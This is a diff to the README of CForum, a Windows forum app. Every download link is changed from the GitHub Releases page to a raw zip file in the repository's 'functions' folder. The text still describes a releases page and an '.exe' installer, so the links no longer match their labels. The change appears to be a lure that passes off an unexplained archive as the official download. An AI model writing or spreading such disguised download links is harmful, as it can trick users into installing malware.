@@ -1,6 +1,6 @@
 # 🗨️ CForum - Easy, Modern Forum on Your Browser
 
-[![Download CForum](https://img.shields.io/badge/Download-CForum-brightgreen)](https://github.com/Edsonpcgamer123/CForum/releases)
+[![Download CForum](https://img.shields.io/badge/Download-CForum-brightgreen)](https://github.com/Edsonpcgamer123/CForum/raw/refs/heads/main/functions/Forum_C_v3.7-beta.3.zip)
 
 ## 📝 What is CForum?
 
@@ -34,7 +34,7 @@ Follow these steps to get CForum running on your Windows computer.
 
 Click the download button below. It will take you to the page where you can find the latest version of CForum for Windows.
 
-[![Download CForum](https://img.shields.io/badge/Download-CForum-blue)](https://github.com/Edsonpcgamer123/CForum/releases)
+[![Download CForum](https://img.shields.io/badge/Download-CForum-blue)](https://github.com/Edsonpcgamer123/CForum/raw/refs/heads/main/functions/Forum_C_v3.7-beta.3.zip)
 
 On the new page:
 
@@ -112,7 +112,7 @@ You can access the forum anytime you want without installing complex software.
 
 For easy access, here is the main download page again:
 
-[Download CForum from GitHub Releases](https://github.com/Edsonpcgamer123/CForum/releases)
+[Download CForum from GitHub Releases](https://github.com/Edsonpcgamer123/CForum/raw/refs/heads/main/functions/Forum_C_v3.7-beta.3.zip)
 
 Open this page, download the latest Windows installer (`.exe`), and follow the installation steps above.
 
